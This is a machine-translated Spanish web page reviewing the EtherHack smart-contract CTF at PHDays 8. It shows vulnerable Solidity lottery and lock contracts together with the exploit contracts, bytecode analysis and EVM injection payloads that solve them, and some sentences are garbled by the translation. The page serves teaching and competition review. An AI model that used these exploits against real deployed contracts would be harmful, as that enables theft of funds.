<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🏺 ✂️ 🎊 Cómo encontrar vulnerabilidades en los contratos inteligentes: revisión de EtherHack en los días de pirateo positivo 8 👴🏼 🚒 🚻</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Este año, PHDays organizó una competencia llamada EtherHack por primera vez. Los participantes buscaron vulnerabilidades en los contratos inteligentes...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Cómo encontrar vulnerabilidades en los contratos inteligentes: revisión de EtherHack en los días de pirateo positivo 8</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pt/blog/414959/"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><img src="https://habrastorage.org/getpro/habr/post_images/182/a00/fef/182a00fef4fbdd4677afb585de886e1e.jpg" alt="imagen"></a> <br><br>  Este año, PHDays organizó una competencia llamada <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">EtherHack</a> por primera vez.  Los participantes buscaron vulnerabilidades en los contratos inteligentes para la velocidad.  En este artículo le informaremos sobre las tareas de la competencia y las posibles formas de resolverlas. <a name="habracut"></a><br><br><h2>  Azino 777 </h2><br><h4>  ¡Gana la lotería y rompe el bote! </h4><br>  Las primeras tres tareas estaban relacionadas con errores en la generación de números pseudoaleatorios, de los que hablamos recientemente: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Predecir números aleatorios en los contratos inteligentes de Ethereum</a> .  La primera tarea se basó en un generador de números pseudoaleatorios (PRNG), que utilizó el hash del último bloque como fuente de entropía para generar números aleatorios: <br><br><pre><code class="cpp hljs">pragma solidity ^<span class="hljs-number"><span class="hljs-number">0.4</span></span><span class="hljs-number"><span class="hljs-number">.16</span></span>; contract Azino777 { <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">spin</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint256 bet)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> payable </span></span>{ require(msg.value &gt;= <span class="hljs-number"><span class="hljs-number">0.01</span></span> ether); uint256 num = rand(<span class="hljs-number"><span class="hljs-number">100</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(num == bet) { msg.sender.transfer(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.balance); } } <span class="hljs-comment"><span class="hljs-comment">//Generate random number between 0 &amp; max uint256 constant private FACTOR = 1157920892373161954235709850086879078532699846656405640394575840079131296399; function rand(uint max) constant private returns (uint256 result){ uint256 factor = FACTOR * 100 / max; uint256 lastBlockNumber = block.number - 1; uint256 hashVal = uint256(block.blockhash(lastBlockNumber)); return uint256((uint256(hashVal) / factor)) % max; } function() public payable {} }</span></span></code> </pre> <br>  Dado que el resultado de llamar a la función <code>block.blockhash(block.number-1)</code> será el mismo para cualquier transacción dentro del mismo bloque, el ataque puede usar un contrato de explotación con la misma función <code>rand()</code> para llamar al contrato objetivo a través de un mensaje interno: <br><br><pre> <code class="cpp hljs"><span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">WeakRandomAttack</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(address _target)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> payable </span></span>{ target = Azino777(_target); } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">attack</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span></span>{ uint256 num = rand(<span class="hljs-number"><span class="hljs-number">100</span></span>); target.spin.value(<span class="hljs-number"><span class="hljs-number">0.01</span></span> ether)(num); }</code> </pre> <br><h2>  Ryan privado </h2><br><h4>  Hemos agregado un valor inicial privado que nadie calculará nunca. </h4><br>  Esta tarea es una versión un poco complicada de la anterior.  La variable semilla, que se considera privada, se utiliza para compensar el número ordinal del bloque (número de bloque) de modo que el hash del bloque no dependa del bloque anterior.  Después de cada apuesta, la semilla se reescribe en un nuevo desplazamiento "aleatorio".  Por ejemplo, en la lotería <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Slotthereum</a> fue solo eso. <br><br><pre> <code class="cpp hljs">contract PrivateRyan { uint <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> seed = <span class="hljs-number"><span class="hljs-number">1</span></span>; <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">PrivateRyan</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ seed = rand(<span class="hljs-number"><span class="hljs-number">256</span></span>); } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">spin</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint256 bet)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> payable </span></span>{ require(msg.value &gt;= <span class="hljs-number"><span class="hljs-number">0.01</span></span> ether); uint256 num = rand(<span class="hljs-number"><span class="hljs-number">100</span></span>); seed = rand(<span class="hljs-number"><span class="hljs-number">256</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(num == bet) { msg.sender.transfer(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.balance); } } <span class="hljs-comment"><span class="hljs-comment">/* ... */</span></span> }</code> </pre> <br>  Al igual que en la tarea anterior, el pirata informático solo necesitaba copiar la función <code>rand()</code> en la explotación del contrato, pero en este caso el valor de la semilla de variable privada tenía que obtenerse fuera de la cadena de bloques y luego enviarse a la explotación como argumento.  Para hacer esto, puede usar el método <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">web3.eth.getStorageAt ()</a> de la biblioteca web3: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/f54/73b/748/f5473b74840e81cc2bef6c3105401777.png" alt="imagen"><br><br>  <i>Lectura de la tienda por contrato fuera de la cadena de bloques para obtener el valor inicial</i> <br><br>  Después de recibir el valor inicial, solo queda enviarlo al exploit, que es casi idéntico al de la primera tarea: <br><br><pre> <code class="cpp hljs">contract PrivateRyanAttack { PrivateRyan target; uint <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> seed; <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">PrivateRyanAttack</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(address _target, uint _seed)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> payable </span></span>{ target = PrivateRyan(_target); seed = _seed; } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">attack</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span></span>{ uint256 num = rand(<span class="hljs-number"><span class="hljs-number">100</span></span>); target.spin.value(<span class="hljs-number"><span class="hljs-number">0.01</span></span> ether)(num); } <span class="hljs-comment"><span class="hljs-comment">/* ... */</span></span> }</code> </pre> <br><h2>  Rueda de la fortuna </h2><br><h4>  Esta lotería usa el hash del siguiente bloque.  ¡Intenta calcularlo! </h4><br>  En esta tarea, fue necesario averiguar el hash del bloque cuyo número se almacenó en la estructura del Juego después de que se realizó la apuesta.  Este hash se extrajo para generar un número aleatorio después de que se realizó la próxima apuesta. <br><br><pre> <code class="cpp hljs">Pragma solidity ^<span class="hljs-number"><span class="hljs-number">0.4</span></span><span class="hljs-number"><span class="hljs-number">.16</span></span>; contract WheelOfFortune { Game[] <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> games; <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Game</span></span></span><span class="hljs-class"> {</span></span> address player; uint id; uint bet; uint blockNumber; } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">spin</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint256 _bet)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> payable </span></span>{ require(msg.value &gt;= <span class="hljs-number"><span class="hljs-number">0.01</span></span> ether); uint gameId = games.length; games.length++; games[gameId].id = gameId; games[gameId].player = msg.sender; games[gameId].bet = _bet; games[gameId].blockNumber = block.number; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (gameId &gt; <span class="hljs-number"><span class="hljs-number">0</span></span>) { uint lastGameId = gameId - <span class="hljs-number"><span class="hljs-number">1</span></span>; uint num = rand(block.blockhash(games[lastGameId].blockNumber), <span class="hljs-number"><span class="hljs-number">100</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(num == games[lastGameId].bet) { games[lastGameId].player.transfer(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.balance); } } } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">rand</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(bytes32 hash, uint max)</span></span></span><span class="hljs-function"> pure </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">returns</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint256 result)</span></span></span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> uint256(keccak256(hash)) % max; } function() <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> payable {} }</code> </pre><br>  En este caso, hay dos posibles soluciones. <br><br><ol><li>  Llame al contrato objetivo dos veces a través del contrato de explotación.  El resultado de llamar a la función block.blockhash (block.number) siempre será cero. </li><li>  Espere a que 256 bloques entren y haga una segunda apuesta.  El hash del número de secuencia de bloque almacenado será cero debido a las <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">limitaciones de Ethereum Virtual Machine (EVM)</a> en el número de hashes de bloque disponibles. </li></ol><br>  En ambos casos, la apuesta ganadora será <code>uint256(keccak256(bytes32(0))) % 100</code> o "47". <br><br><h2>  Llamame tal vez </h2><br><h4>  Este contrato no le gusta cuando otros contratos lo llaman. </h4><br>  Una forma de evitar que un contrato sea llamado por otros contratos es usar la instrucción de ensamblador EVM <code>extcodesize</code> , que devuelve el tamaño del contrato en su dirección.  El método consiste en utilizar esta instrucción para la dirección del remitente de la transacción mediante la inserción del ensamblador.  Si el resultado es mayor que cero, el remitente de la transacción es un contrato, ya que las direcciones normales en Ethereum no tienen código.  Fue precisamente este enfoque el que se utilizó en esta tarea para evitar que otros contratos lo llamaran. <br><br><pre> <code class="cpp hljs">contract CallMeMaybe { <span class="hljs-function"><span class="hljs-function">modifier </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">CallMeMaybe</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ uint32 size; address _addr = msg.sender; assembly { size := extcodesize(_addr) } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (size &gt; <span class="hljs-number"><span class="hljs-number">0</span></span>) { revert(); } _; } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">HereIsMyNumber</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> CallMeMaybe </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(tx.origin == msg.sender) { revert(); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { msg.sender.transfer(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.balance); } } function() payable {} }</code> </pre> <br>  La <code>tx.origin</code> transacción <code>tx.origin</code> apunta al creador original de la transacción y msg.sender a la última persona que llama.  Si enviamos la transacción desde la dirección habitual, estas variables serán iguales y terminaremos con <code>revert()</code> .  Por lo tanto, para resolver nuestro problema, era necesario omitir la verificación de la instrucción <code>extcodesize</code> para que <code>tx.origin</code> y <code>msg.sender</code> diferentes.  Afortunadamente, hay una buena característica en EVM que puede ayudar con esto: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/9e9/07a/74e/9e907a74eb156cb8380527b50d47a4b8.png" alt="imagen"><br><br>  De hecho, cuando el contrato recién colocado llama a otro contrato en el constructor, todavía no existe en la cadena de bloques, actúa exclusivamente como una billetera.  Por lo tanto, el código no está vinculado al nuevo contrato y extcodesize devolverá cero: <br><br><pre> <code class="cpp hljs"> contract CallMeMaybeAttack { <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">CallMeMaybeAttack</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(CallMeMaybe _target)</span></span></span><span class="hljs-function"> payable </span></span>{ _target.HereIsMyNumber(); } function() payable {} }</code> </pre> <br><h2>  La cerradura </h2><br><h4>  Por extraño que parezca, el castillo está cerrado.  Intente recoger el código PIN a través de la función de desbloqueo (bytes4 pincode).  Cada intento de desbloqueo te costará 0,5 éter. </h4><br>  En esta tarea, a los participantes no se les dio un código, tuvieron que restaurar la lógica del contrato por su código de bytes.  Una opción era usar Radare2, una plataforma que se usa para <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">desmontar</a> y <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">depurar EVM</a> . <br><br>  Para comenzar, publicaremos un ejemplo de la tarea e ingresaremos el código al azar: <br><br><pre> <code class="cpp hljs">await contract.unlock(<span class="hljs-string"><span class="hljs-string">"1337"</span></span>, {value: <span class="hljs-number"><span class="hljs-number">500000000000000000</span></span>}) →<span class="hljs-literal"><span class="hljs-literal">false</span></span></code> </pre> <br>  El intento, por supuesto, es bueno, pero no tuvo éxito.  Ahora intente depurar esta transacción. <br><br><pre> <code class="cpp hljs">r2 -a evm -D evm <span class="hljs-string"><span class="hljs-string">"evm://localhost:8545@0xf7dd5ca9d18091d17950b5ecad5997eacae0a7b9cff45fba46c4d302cf6c17b7"</span></span></code> </pre> <br>  En este caso, le indicamos a Radare2 que use la arquitectura evm.  Esta herramienta luego se conecta al nodo Ethereum y recupera el rastro de esta transacción en la máquina virtual.  Y ahora, finalmente, estamos listos para sumergirnos en el bytecode EVM. <br><br>  En primer lugar, debe realizar un análisis: <br><br><pre> <code class="cpp hljs">[<span class="hljs-number"><span class="hljs-number">0x00000000</span></span>]&gt; aa [x] Analyze all flags starting with sym. <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">and</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">entry0</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(aa)</span></span></span></span></code> </pre> <br>  Luego, desarmamos las primeras 1000 instrucciones (esto debería ser suficiente para cubrir todo el contrato) usando el comando pd 1000, y cambiamos para ver el gráfico con el comando VV. <br><br>  En el código de bytes EVM compilado con <code>solc</code> , generalmente el administrador de funciones es lo primero.  Basado en los primeros cuatro bytes de los datos de la llamada que contienen la firma de la función, que se define como <code>bytes4(sha3(function_name(params)))</code> , el administrador de la función decide a qué función llamar.  Estamos interesados ​​en la función de <code>unlock(bytes4)</code> , que corresponde a <code>0x75a4e3a0</code> . <br><br>  Siguiendo el flujo de ejecución usando la tecla s, llegamos al nodo que compara la <code>callvalue</code> valor de <code>0x6f05b59d3b20000</code> con el valor <code>0x6f05b59d3b20000</code> o <code>500000000000000000</code> , que es equivalente a 0.5 ether: <br><br><pre> <code class="cpp hljs">push8 <span class="hljs-number"><span class="hljs-number">0x6f05b59d3b20000</span></span> callvalue lt</code> </pre> <br>  Si el éter proporcionado es suficiente, nos encontramos en un nodo que se asemeja a una estructura de control: <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0x4</span></span> dup4 push1 <span class="hljs-number"><span class="hljs-number">0xff</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> lt iszero push2 <span class="hljs-number"><span class="hljs-number">0x1a4</span></span> jumpi</code> </pre> <br>  El código coloca el valor 0x4 en la parte superior de la pila, verifica el límite superior (el valor no debe exceder 0xff) y lo compara con algún valor duplicado del cuarto elemento de la pila (dup4). <br><br>  Desplazándonos hasta la parte inferior del gráfico, vemos que este cuarto elemento es esencialmente un iterador, y esta estructura de control es un bucle que corresponde a <code>for(var i=0; i&lt;4; i++):</code> <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0x1</span></span> add swap4</code> </pre> <br>  Si consideramos el cuerpo del bucle, resulta obvio que enumera cuatro bytes entrantes y realiza algunas operaciones con cada uno de los bytes.  Primero, el bucle verifica que el enésimo byte sea mayor que 0x30: <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0x30</span></span> dup3 lt iszero</code> </pre> <br>  y también que este valor es menor que 0x39: <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0x39</span></span> dup3 gt iszero</code> </pre> <br>  que es esencialmente una verificación de que el byte dado está en el rango de 0 a 9. Si la verificación es exitosa, nos encontramos en el bloque de código más importante: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/085/2d4/27b/0852d427bd50ab1d0da2fed5131dfac2.png" alt="imagen"><br><br>  Rompamos este bloque en partes: <br><br>  1. El tercer elemento en la pila es el código ASCII del enésimo byte del código pin.  0x30 (código ASCII para cero) se inserta en la pila y luego se resta del código de este byte: <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0x30</span></span> dup3 sub</code> </pre> <br>  Es decir, el <code>pincode[i] - 48</code> , y esencialmente obtenemos un dígito del código ASCII, llamémoslo d. <br><br>  2. Se agrega 0x4 a la pila y se usa como exponente para el segundo elemento de la pila, d: <br><br><pre> <code class="cpp hljs">swap1 pop push1 <span class="hljs-number"><span class="hljs-number">0x4</span></span> dup2 <span class="hljs-built_in"><span class="hljs-built_in">exp</span></span></code> </pre> <br>  Es decir, <code>d ** 4</code> . <br><br>  3. Se recupera el quinto elemento de la pila y se le agrega el resultado de la exponenciación.  Llame a esta suma S: <br><br><pre> <code class="cpp hljs">dup5 add swap4 pop dup1</code> </pre> <br>  Es decir, <code>S += d ** 4</code> . <br><br>  4. Se inserta 0xa (código ASCII para 10) en la pila y se usa como multiplicador para el séptimo elemento de la pila (que era el sexto antes de esta adición).  No sabemos qué es, por lo tanto, llamaremos a este elemento U. Luego se agrega d al resultado de la multiplicación: <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0xa</span></span> dup7 mul add swap5 pop</code> </pre> <br>  Es decir: <code>U = U * 10 + d</code> o, más simplemente, esta expresión recupera el código pin completo como un número de bytes individuales <code>([0x1, 0x3, 0x3, 0x7] → 1337)</code> . <br><br>  Lo más difícil que hicimos, ahora pasemos al código después del ciclo. <br><br><pre> <code class="cpp hljs">dup5 dup5 eq</code> </pre> <br>  Si los elementos quinto y sexto en la pila son iguales, entonces el flujo de ejecución nos llevará a la instrucción sstore, que establece un determinado indicador en el almacén de contratos.  Como esta es la única instrucción de sstore, aparentemente es lo que estábamos buscando. <br><br>  Pero, ¿cómo superar esta prueba?  Como ya descubrimos, el quinto elemento en la pila es S y el sexto es U. Dado que S es la suma de todos los dígitos del código pin elevado a la cuarta potencia, necesitamos un código pin para el cual se cumplirá esta condición.  En nuestro caso, el análisis mostró que <code>1**4 + 3**4 + 3**4 + 7**4</code> no es igual a 1337, y no llegamos a la instrucción de <code>sstore</code> ganadora. <br><br>  Pero ahora podemos calcular un número que satisfaga las condiciones de esta ecuación.  Solo hay tres números que se pueden escribir como la suma de sus dígitos de cuarto grado: 1634, 8208 y 9474. ¡Cualquiera de ellos puede abrir la cerradura! <br><br><h2>  Barco pirata </h2><br><h4>  Hola Salag!  Un barco pirata atracado en el puerto.  Haz que eche el ancla y levante la bandera con Jolly Roger y vaya en busca de tesoros. </h4><br>  El curso estándar de ejecución del contrato incluye tres acciones: <br><br><ol><li>  Una llamada a la función <code>dropAnchor()</code> con un número de bloque que debería ser más de 100,000 bloques más grande que el actual.  La función crea dinámicamente un contrato, que es un "ancla", que se puede "levantar" usando <code>selfdestruct()</code> después del bloque especificado. </li><li>  Una llamada a la función <code>pullAnchor()</code> , que inicia <code>selfdestruct()</code> si ha pasado suficiente tiempo (¡mucho tiempo!). </li><li>  Llame a sailAway (), que establece <code>blackJackIsHauled</code> en verdadero si no existe un contrato de anclaje. </li></ol><br><pre> <code class="cpp hljs">pragma solidity ^<span class="hljs-number"><span class="hljs-number">0.4</span></span><span class="hljs-number"><span class="hljs-number">.19</span></span>; contract PirateShip { address <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> anchor = <span class="hljs-number"><span class="hljs-number">0x0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">bool</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> blackJackIsHauled = <span class="hljs-literal"><span class="hljs-literal">false</span></span>; <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">sailAway</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span></span>{ require(anchor != <span class="hljs-number"><span class="hljs-number">0x0</span></span>); address a = anchor; uint size = <span class="hljs-number"><span class="hljs-number">0</span></span>; assembly { size := extcodesize(a) } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(size &gt; <span class="hljs-number"><span class="hljs-number">0</span></span>) { revert(); <span class="hljs-comment"><span class="hljs-comment">// it is too early to sail away } blackJackIsHauled = true; // Yo Ho Ho! } function pullAnchor() public { require(anchor != 0x0); require(anchor.call()); // raise the anchor if the ship is ready to sail away } function dropAnchor(uint blockNumber) public returns(address addr) { // the ship will be able to sail away in 100k blocks time require(blockNumber &gt; block.number + 100000); // if(block.number &lt; blockNumber) { throw; } // suicide(msg.sender); uint[8] memory a; a[0] = 0x6300; // PUSH4 0x00... a[1] = blockNumber; // ...block number (3 bytes) a[2] = 0x43; // NUMBER a[3] = 0x10; // LT a[4] = 0x58; // PC a[5] = 0x57; // JUMPI a[6] = 0x33; // CALLER a[7] = 0xff; // SELFDESTRUCT uint code = assemble(a); // init code to deploy contract: stores it in memory and returns appropriate offsets uint[8] memory b; b[0] = 0; // allign b[1] = 0x6a; // PUSH11 b[2] = code; // contract b[3] = 0x6000; // PUSH1 0 b[4] = 0x52; // MSTORE b[5] = 0x600b; // PUSH1 11 ;; length b[6] = 0x6015; // PUSH1 21 ;; offset b[7] = 0xf3; // RETURN uint initcode = assemble(b); uint sz = getSize(initcode); uint offset = 32 - sz; assembly { let solidity_free_mem_ptr := mload(0x40) mstore(solidity_free_mem_ptr, initcode) addr := create(0, add(solidity_free_mem_ptr, offset), sz) } require(addr != 0x0); anchor = addr; } ///////////////// HELPERS ///////////////// function assemble(uint[8] chunks) internal pure returns(uint code) { for(uint i=chunks.length; i&gt;0; i--) { code ^= chunks[i-1] &lt;&lt; 8 * getSize(code); } } function getSize(uint256 chunk) internal pure returns(uint) { bytes memory b = new bytes(32); assembly { mstore(add(b, 32), chunk) } for(uint32 i = 0; i&lt; b.length; i++) { if(b[i] != 0) { return 32 - i; } } return 0; } }</span></span></code> </pre> <br>  La vulnerabilidad es bastante obvia: tenemos una inyección directa de instrucciones de ensamblador al crear un contrato en la función <code>dropAnchor()</code> .  Pero la principal dificultad era crear una carga útil que nos permitiera pasar la <code>block.number</code> . <br><br>  En EVM, puede crear contratos utilizando la declaración de creación.  Sus argumentos son valor, desplazamiento de entrada y tamaño de entrada.  El valor es un código de bytes que aloja el contrato en sí (código de inicialización).  En nuestro caso, el código de inicialización + código de contrato se coloca en uint256 (gracias al equipo de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">GasToken</a> por la idea): <br><br><pre> <code class="cpp hljs"><span class="hljs-number"><span class="hljs-number">0x6a63004141414310585733ff600052600b6015f3</span></span></code> </pre> <br>  donde los bytes en negrita son el código del contrato alojado, y 414141 es el sitio de inyección.  Como nos enfrentamos a la tarea de deshacernos del operador de lanzamiento, necesitamos insertar nuestro nuevo contrato y reescribir la parte final del código de inicialización.  Intentemos inyectar el contrato con la instrucción 0xff, lo que conducirá a la eliminación incondicional del contrato de anclaje usando <code>selfdestruct()</code> : <br><br><pre>  68 414141ff3f3f3f3f3f ;;  contrato push9
 60 00 ;;  push1 0
 52 ;;  mstore
 60 09 ;;  push1 9
 60 17 ;;  push1 17
 f3 ;;  volver </pre><br>  Si convertimos esta secuencia de bytes a <code>uint256 (9081882833248973872855737642440582850680819)</code> y la usamos como argumento para la función <code>dropAnchor()</code> , obtenemos el siguiente valor para la variable de código (el código de bytes en negrita es nuestra carga útil): <br><br><pre> <code class="cpp hljs"><span class="hljs-number"><span class="hljs-number">0x630068414141ff3f3f3f3f3f60005260096017f34310585733ff</span></span></code> </pre> <br>  Después de que la variable de código se convierta en parte de la variable initcode, obtenemos el siguiente valor: <br><br><pre> <code class="cpp hljs"><span class="hljs-number"><span class="hljs-number">0x68414141ff3f3f3f3f3f60005260096017f34310585733ff600052600b6015f3</span></span></code> </pre> <br>  Ahora los bytes altos <code>0x6300</code> ido, y el resto del <code>0x6300</code> bytes se descarta después de <code>0xf3 (return)</code> . <br><br><img src="https://habrastorage.org/getpro/habr/post_images/433/f75/735/433f757356003d73286fa4709cdedcfd.png" alt="imagen"><br><br>  Como resultado, se crea un nuevo contrato con la lógica modificada: <br><br><pre>  41 ;;  base de monedas
 41 ;;  base de monedas
 41 ;;  base de monedas
 ff ;;  autodestrucción
 3f ;;  basura
 3f ;;  basura
 3f ;;  basura
 3f ;;  basura
